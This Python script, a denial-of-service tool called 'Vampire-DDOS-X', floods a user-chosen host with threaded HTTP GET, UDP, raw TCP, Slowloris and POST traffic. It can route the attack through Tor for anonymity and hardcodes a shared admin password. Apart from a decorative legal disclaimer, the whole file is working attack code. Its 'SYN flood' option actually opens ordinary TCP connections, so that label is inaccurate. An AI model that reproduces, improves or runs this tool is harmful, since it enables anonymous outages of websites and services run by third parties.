import os
import sys
import time
import socket
import threading
import random
import subprocess
import getpass

# Auto-install required modules
def install(module, pip_name=None):
    pip_name = pip_name or module
    try:
        __import__(module)
    except ImportError:
        subprocess.call([sys.executable, '-m', 'pip', 'install', pip_name])

install("colorama")
install("socks", "pysocks")

from colorama import Fore, Style, init
import socks

init(autoreset=True)

# Admin Passwords
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# Global Counters
requests_sent = 0
threads_running = 0
attack_active = True

# Banners
admin_banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ ADMIN PANEL ▒▒▒█████         ║
║    ╔═╗╔═╗╔╦╗╔═╗╦═╗╦╔═╗╔═╗╔═╗  ╔═╗╦ ╦         ║
║    ╚═╗║╣  ║║║╣ ╠╦╝║║ ╦║╣ ╚═╗  ║ ╦║ ║         ║
║    ╚═╝╚═╝═╩╝╚═╝╩╚═╩╚═╝╚═╝╚═╝  ╚═╝╚═╝         ║
║            [Vampire-DDOS-X]                 ║
║        Developed by: Muhammad Shourov       ║
╚══════════════════════════════════════════════╝
"""

user_banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ USER PANEL ▒▒▒█████          ║
║    ██    ██ ██████  ██████  ██    ██        ║
║    ██    ██ ██   ██ ██   ██ ██    ██        ║
║    ██    ██ ██████  ██████  ██    ██        ║
║    ██    ██ ██      ██      ██    ██        ║
║     ██████  ██      ██       ██████         ║
║          [Vampire-DDOS-X]                   ║
║      Created by: Muhammad Shourov           ║
╚══════════════════════════════════════════════╝
"""

def show_disclaimer():
    from itertools import cycle

    colors = cycle([
        Fore.RED, Fore.LIGHTRED_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX,
        Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.CYAN, Fore.LIGHTCYAN_EX
    ])
    text_lines = [
        "╔════════════════════════════════════════════════════════════════╗",
        "║ ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗   ██╗███████╗██████╗   ║",
        "║ ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗  ║",
        "║ ██║   ██║███████║██╔████╔██║██████╔╝██║   ██║█████╗  ██████╔╝  ║",
        "║ ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║   ██║██╔══╝  ██╔══██╗  ║",
        "║  ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████╗██║  ██║  ║",
        "║   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║",
        "╠════════════════════════════════════════════════════════════════╣",
        "║ WARNING: This tool is a DIGITAL WEAPON.                       ║",
        "║ Unauthorized use can lead to SERIOUS LEGAL CONSEQUENCES.     ║",
        "║                                                               ║",
        "║ This tool is strictly for:                                    ║",
        "║   → Cybersecurity Experts                                     ║",
        "║   → Ethical Hackers (with permission)                         ║",
        "║   → Legal Penetration Testers                                 ║",
        "║                                                               ║",
        "║ Misuse = YOU are FULLY RESPONSIBLE.                          ║",
        "║ We (Vampire Squad) take NO LIABILITY.                        ║",
        "║                                                               ║",
        "║ → Developed by: Muhammad Shourov aka VAMPIRE                 ║",
        "║ → Team: Vampire Squad | GitHub: github.com/vampiresquad     ║",
        "╚════════════════════════════════════════════════════════════════╝",
        "[!] Press Ctrl+C now if you're not fully authorized..."
    ]

    for line in text_lines:
        color = next(colors)
        for char in line:
            sys.stdout.write(color + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.002)  # Slow glitch effect
        print()
        time.sleep(0.05)

def install_tor():
    try:
        subprocess.call(['pkg', 'install', '-y', 'tor'])
    except:
        print("[!] TOR installation failed. Please install manually.")

def enable_tor():
    print("[?] Enable Anonymous Mode (TOR)? (y/n): ", end='')
    if input().lower() == 'y':
        password = getpass.getpass("Enter TOR password: ")
        if password == TOR_PASSWORD:
            print("[✓] Enabling TOR routing...")
            install_tor()
            os.system("tor &")
            time.sleep(5)
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            print("[✓] TOR routing enabled.")
        else:
            print("[!] Wrong TOR password. Skipping...")

def attack(target, port, attack_type):
    global requests_sent, threads_running, attack_active
    threads_running += 1
    try:
        while attack_active:
            try:
                if attack_type == "2":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(1024), (target, port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    if attack_type == "1":
                        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                        s.send(req.encode())
                    elif attack_type == "3":
                        s.send(b"\x00" * 1024)
                    elif attack_type == "4":
                        for _ in range(50):
                            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                            time.sleep(0.5)
                    elif attack_type == "5":
                        payload = "username=admin&password=admin"
                        headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
                        s.send(headers.encode())
                s.close()
                requests_sent += 1
            except:
                continue
    finally:
        threads_running -= 1

def show_stats():
    while attack_active:
        print(f"{Fore.YELLOW}[~] Requests Sent: {requests_sent} | Threads Running: {threads_running}{Style.RESET_ALL}", end='\r')
        time.sleep(1)

def main():
    print(f"{Fore.CYAN}[?] Enter Mode (admin/user): {Style.RESET_ALL}", end='')
    mode = input().strip().lower()
    show_disclaimer()

    if mode == "admin":
        pw = getpass.getpass("Enter Admin Password: ")
        if pw != ADMIN_PASSWORD:
            print("[!] Wrong password. Access denied.")
            return
        print(admin_banner)
    else:
        print(user_banner)

    enable_tor()

    try:
        target = input("[+] Target IP/Host: ").strip()
        port = int(input("[+] Target Port: "))
        if port <= 0 or port > 65535:
            print("[!] Invalid port number.")
            return
        threads = int(input("[+] Threads Count: "))
        if threads <= 0:
            print("[!] Thread count must be positive.")
            return
    except ValueError:
        print("[!] Invalid input. Please enter numbers where required.")
        return

    print("""
[?] Select Attack Type:
1. HTTP Flood
2. UDP Flood
3. SYN Flood
4. Slowloris
5. POST Flood
""")
    attack_type = input("[+] Choice: ").strip()
    if attack_type not in ["1", "2", "3", "4", "5"]:
        print("[!] Invalid attack type.")
        return

    print(f"{Fore.GREEN}[✓] Attack started on {target}:{port} using mode {attack_type} with {threads} threads.{Style.RESET_ALL}")
    time.sleep(1)

    threading.Thread(target=show_stats).start()
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, port, attack_type))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        global attack_active
        attack_active = False
        print(f"\n{Fore.RED}[!] Attack stopped by user.{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[#] Total Requests Sent: {requests_sent}{Style.RESET_ALL}")
        os.system("pkill tor")
        print(f"{Fore.RED}[X] Shutting down Vampire-DDOS-X...We are Legend Warrior, We can do Anything! Stay With_Us!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
